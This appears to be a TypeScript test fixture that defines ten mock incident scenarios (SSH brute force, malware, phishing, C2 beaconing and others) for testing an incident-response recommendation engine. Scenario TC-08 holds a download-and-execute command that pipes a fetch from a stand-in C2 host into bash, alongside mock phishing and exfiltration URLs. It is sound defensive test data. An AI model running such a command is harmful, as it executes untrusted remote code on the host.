import { fixtureCatalog } from "./hc1Provenance";
import { GenerateRecommendationUseCase } from "../../src/application/recommendation/use-cases/GenerateRecommendation.usecase";
import { RecommendationContextBuilder } from "../../src/application/recommendation/services/RecommendationContextBuilder";
import { RecommendationValidator } from "../../src/infrastructure/recommendation-validation/RecommendationValidator";
import { ContainmentProcedureLoader } from "../../src/infrastructure/knowledge/ContainmentProcedureLoader";
import { IRetrievedKnowledgePort } from "../../src/application/recommendation/ports/IRetrievedKnowledgePort";
import { IRecommendationContextRepository } from "../../src/application/recommendation/ports/IRecommendationContextRepository";
import { IRecommendationAgentPort } from "../../src/application/recommendation/ports/IRecommendationAgentPort";
import { IRecommendationRepository, CreateRecommendationData } from "../../src/domain/recommendation/repositories/IRecommendationRepository";
import { IActionRepository } from "../../src/domain/action/repositories/IActionRepository";
import { IRunbookRepository } from "../../src/domain/runbook/repositories/IRunbookRepository";
import { Runbook } from "../../src/domain/runbook/entities/Runbook.entity";
import { Playbook } from "../../src/domain/playbook/entities/Playbook.entity";
import { AuditLogger } from "../../src/infrastructure/database/postgres/repositories/AuditLogger";
import { RecommendationContextDto } from "../../src/application/recommendation/dto/RecommendationContextDto";
import { ACTIONS, ACTION_RUNBOOK_CODES } from "../../prisma/seeds/action.seed";
import { RUNBOOKS } from "../../prisma/seeds/runbook.seed";
import { INCIDENT_PLAYBOOKS } from "../../prisma/seeds/playbook.seed";
import { FakeRecommendationAgent } from "../../src/infrastructure/ai/FakeRecommendationAgent";

/**
 * TC-01..TC-10 containment scenarios over the REAL seeded catalogs (Action Catalog, action-level Runbooks,
 * incident-level Playbooks), the REAL YAML containment procedures, context builder, validator and use case.
 * Only the repositories, the audit log and the Policy result are in-memory. IOC values are the mock TC values of
 * src/evaluation/groundTruth.ts; the Policy stand-in mirrors POL-A01 (HIGH-impact Actions need IR_TEAM approval).
 */
export const TENANT = "tenant-1";
export const INCIDENT = "incident-1";

export interface Scenario {
  caseId: string;
  attackType: string;
  playbook: string;
  title: string;
  host: string;
  mitre: string;
  techniques?: string[];
  iocs: { iocType: string; iocValue: string; networkRole?: "source" | "destination" }[];
  /** IOC values the alert evidence names (only these are targetable). */
  evidenceIocs: string[];
  /** Extra evidence rows recorded for the incident (e.g. "Successful SSH login for root"); they feed the evidence signals. */
  facts?: string[];
  /** Re-hunt round N: the investigation cycle and the Action + target pairs earlier Recommendations already proposed. */
  investigationNumber?: number;
  previousSteps?: { recommendationNumber: number; investigationNumber: number; actionCode: string; target: string }[];
}

export const SCENARIOS: Scenario[] = [
  { caseId: "TC-01", attackType: "BRUTE_FORCE", playbook: "PB-SSH-BRUTEFORCE", title: "sshd: brute force trying to get access to the system. Authentication failed.", host: "WKS-DEV-12", mitre: "T1110",
    iocs: [{ iocType: "IPV4", iocValue: "185.220.101.45", networkRole: "source" }, { iocType: "USERNAME", iocValue: "root" }], evidenceIocs: ["185.220.101.45", "root"] },
  { caseId: "TC-02", attackType: "MALWARE", playbook: "PB-MALWARE", title: "Malicious file detected: Invoice_Q4_2026.xls.exe", host: "FIN-WS-07", mitre: "T1204.002",
    iocs: [{ iocType: "SHA256", iocValue: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f" }, { iocType: "FILE_PATH", iocValue: "/home/finance/Downloads/Invoice_Q4_2026.xls.exe" }],
    evidenceIocs: ["275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", "/home/finance/Downloads/Invoice_Q4_2026.xls.exe"] },
  { caseId: "TC-03", attackType: "PHISHING", playbook: "PB-PHISHING", title: "Phishing link delivered and clicked: credential harvesting page", host: "HR-WS-03", mitre: "T1566.002",
    iocs: [{ iocType: "URL", iocValue: "http://vigix-mock-phish.net/o365/verify?id=hr.clerk" }, { iocType: "DOMAIN", iocValue: "vigix-mock-phish.net" }, { iocType: "EMAIL", iocValue: "it-support@vigix-mock-phish.net" }, { iocType: "USERNAME", iocValue: "hr.clerk" }],
    evidenceIocs: ["http://vigix-mock-phish.net/o365/verify?id=hr.clerk", "vigix-mock-phish.net", "it-support@vigix-mock-phish.net", "hr.clerk"] },
  { caseId: "TC-04", attackType: "ACCOUNT_COMPROMISE", playbook: "PB-ACCOUNT-COMPROMISE", title: "Successful logon for j.smith from an unusual external source", host: "VPN-GW-01", mitre: "T1078",
    iocs: [{ iocType: "IPV4", iocValue: "91.219.236.14", networkRole: "source" }, { iocType: "USERNAME", iocValue: "j.smith" }], evidenceIocs: ["91.219.236.14", "j.smith"] },
  { caseId: "TC-05", attackType: "POWERSHELL", playbook: "PB-POWERSHELL", title: "Encoded PowerShell download cradle executed", host: "HR-WS-03", mitre: "T1059.001",
    iocs: [{ iocType: "URL", iocValue: "http://vigix-mock-stager.net/a.ps1" }, { iocType: "DOMAIN", iocValue: "vigix-mock-stager.net" }, { iocType: "USERNAME", iocValue: "hr.clerk" }],
    evidenceIocs: ["http://vigix-mock-stager.net/a.ps1", "vigix-mock-stager.net", "hr.clerk"] },
  { caseId: "TC-06", attackType: "SQL_INJECTION", playbook: "PB-SQL-INJECTION", title: "SQL injection attempt: UNION SELECT in request parameter", host: "WEB-01", mitre: "T1190",
    iocs: [{ iocType: "IPV4", iocValue: "194.87.29.10", networkRole: "source" }], evidenceIocs: ["194.87.29.10"] },
  { caseId: "TC-07", attackType: "COMMAND_AND_CONTROL", playbook: "PB-C2", title: "Periodic beaconing to a known C2 destination", host: "APP-SRV-02", mitre: "T1071",
    iocs: [{ iocType: "IPV4", iocValue: "193.142.146.212", networkRole: "destination" }, { iocType: "DOMAIN", iocValue: "vigix-mock-c2.net" }, { iocType: "URL", iocValue: "https://vigix-mock-c2.net/gate.php" }],
    evidenceIocs: ["193.142.146.212", "vigix-mock-c2.net", "https://vigix-mock-c2.net/gate.php"] },
  { caseId: "TC-08", attackType: "SUSPICIOUS_PROCESS_EXECUTION", playbook: "PB-SUSPICIOUS-PROCESS", title: "Suspicious process executed from a hidden temp folder", host: "LNX-SRV-04", mitre: "T1059.004",
    iocs: [{ iocType: "PROCESS", iocValue: "/tmp/.cache/kworkerd" }, { iocType: "FILE_PATH", iocValue: "/tmp/.cache/kworkerd" }, { iocType: "SHA256", iocValue: "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64" }, { iocType: "COMMAND", iocValue: "curl -s http://vigix-mock-c2.net/x | base64 -d | bash" }],
    evidenceIocs: ["/tmp/.cache/kworkerd", "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64", "curl -s http://vigix-mock-c2.net/x | base64 -d | bash"] },
  { caseId: "TC-09", attackType: "DATA_EXFILTRATION", playbook: "PB-DATA-EXFIL", title: "Large outbound upload to an external storage service", host: "DB-SRV-01", mitre: "T1567",
    iocs: [{ iocType: "IPV4", iocValue: "45.61.136.77", networkRole: "destination" }, { iocType: "DOMAIN", iocValue: "vigix-mock-exfil.net" }, { iocType: "URL", iocValue: "https://vigix-mock-exfil.net/upload" }],
    evidenceIocs: ["45.61.136.77", "vigix-mock-exfil.net", "https://vigix-mock-exfil.net/upload"] },
  { caseId: "TC-10", attackType: "PRIVILEGE_ESCALATION", playbook: "PB-PRIV-ESC", title: "sudo: eviluser elevated to root without authorization", host: "LNX-SRV-09", mitre: "T1548",
    iocs: [{ iocType: "USERNAME", iocValue: "eviluser" }], evidenceIocs: ["eviluser"] },
];

const actions = ACTIONS.map((a) => ({
  ...a,
  id: `action-${a.code}`,
  enabled: true,
  runbookId: ACTION_RUNBOOK_CODES[a.code] ? `runbook-${ACTION_RUNBOOK_CODES[a.code]}` : null,
}));
const runbooks = RUNBOOKS.map((r) => Runbook.create({ ...r, id: `runbook-${r.code}`, tenantId: TENANT, version: "1.0", status: "ACTIVE", createdAt: new Date(), updatedAt: new Date() }));
const playbooks = INCIDENT_PLAYBOOKS.map((p) =>
  Playbook.create({
    id: `pb-${p.code}`, tenantId: TENANT, code: p.code, name: p.name, description: p.description, version: "1.0", status: "ACTIVE",
    steps: p.steps.map((s) => ({ ...s, id: `${p.code}-${s.stepOrder}` })),
    triggerConditions: { scope: "INCIDENT", incidentType: p.incidentType, mitreTechniques: p.mitreTechniques, allowedActions: p.allowedActions },
  })
);

export const actionRepository = {
  findAll: async () => actions,
  findById: async (id: string) => actions.find((a) => a.id === id) ?? null,
  findByCodes: async (codes: string[]) => actions.filter((a) => codes.includes(a.code)),
} as unknown as IActionRepository;
export const runbookRepository = {
  findAll: async () => runbooks,
  findById: async (id: string) => runbooks.find((r) => r.id === id) ?? null,
  findByCodes: async (codes: string[]) => runbooks.filter((r) => codes.includes(r.code)),
} as unknown as IRunbookRepository;

/** Policy stand-in mirroring POL-A01: HIGH-impact Actions need IR_TEAM approval; IR_TEAM is responsible for all. */
export const policyService = {
  evaluate: async ({ actionId }: { actionId?: string | null }) => {
    const high = actions.find((a) => a.id === actionId)?.impactLevel === "HIGH";
    return { policy: { responsibleRole: "IR_TEAM", approvalRequired: high, approvalRole: high ? "IR_TEAM" : null, reviewRequired: false, reviewRole: null, matchedRules: high ? ["POL-A01"] : [] } };
  },
} as never;

export function contextRepository(s: Scenario): IRecommendationContextRepository {
  return {
    getIncidentContext: async () => ({ incidentId: INCIDENT, investigationNumber: s.investigationNumber ?? 1, title: s.title, status: "investigating", priority: "high", alertSeverity: "high" }),
    getIocs: async () => s.iocs.map((i) => ({ ...i, source: "ALERT", reputationScore: null })),
    getMitreMappings: async () => (s.techniques ?? [s.mitre]).map(techniqueId => ({ techniqueId, tactic: "mapped", confidence: 0.9 })),
    getEvidence: async () => [
      { type: "WAZUH_ALERT", source: "WAZUH", origin: "SYSTEM", title: s.title, timestamp: new Date("2026-10-07T08:00:00Z"), host: s.host, ruleId: "100000", iocValues: s.evidenceIocs },
      ...(s.facts ?? []).map((title) => ({ type: "WAZUH_ALERT", source: "WAZUH", origin: "SYSTEM", title, timestamp: new Date("2026-10-07T08:05:00Z"), host: s.host, ruleId: "100001", iocValues: s.evidenceIocs })),
    ],
    getLatestAiAnalysis: async () => null,
    getPreviousRecommendationSteps: async () => s.previousSteps ?? [],
  } as unknown as IRecommendationContextRepository;
}

export const procedureLoader = new ContainmentProcedureLoader();

export const contextBuilder = (s: Scenario, withProcedure = true, retriever?: IRetrievedKnowledgePort) =>
  new RecommendationContextBuilder(contextRepository(s), actionRepository, runbookRepository, undefined, policyService, undefined, undefined, undefined,
    { read: async () => fixtureCatalog(playbooks) }, withProcedure ? procedureLoader : undefined, retriever);

export async function buildContext(s: Scenario, withProcedure = true, retriever?: IRetrievedKnowledgePort): Promise<RecommendationContextDto> {
  return (await contextBuilder(s, withProcedure, retriever).build(INCIDENT, TENANT, playbooks)).value;
}

/** Runs the real GenerateRecommendationUseCase for a scenario with the given agent (default: FakeRecommendationAgent). */
export async function generate(s: Scenario, agent: IRecommendationAgentPort = new FakeRecommendationAgent(), retriever?: IRetrievedKnowledgePort) {
  const created: CreateRecommendationData[] = [];
  const audit: Array<{ action: string; metadata?: Record<string, unknown> }> = [];
  const recommendationRepository = {
    getNextRecommendationNumber: async () => 1,
    create: async (data: CreateRecommendationData) => {
      created.push(data);
      return { id: `rec-${created.length}`, ...data, snapshotId: "snap-1", steps: data.steps.map((st, i) => ({ ...st, id: `step-${i + 1}` })) };
    },
    supersedePrevious: async () => undefined,
  } as unknown as IRecommendationRepository;
  const auditLogger = { record: async (e: { action: string; metadata?: Record<string, unknown> }) => void audit.push(e) } as unknown as AuditLogger;
  const useCase = new GenerateRecommendationUseCase(contextBuilder(s, true, retriever), agent, "test-agent", new RecommendationValidator(actionRepository, runbookRepository), recommendationRepository, auditLogger);
  const result = await useCase.execute({ incidentId: INCIDENT, tenantId: TENANT });
  return { result, created, audit };
}

export const validator = new RecommendationValidator(actionRepository, runbookRepository);
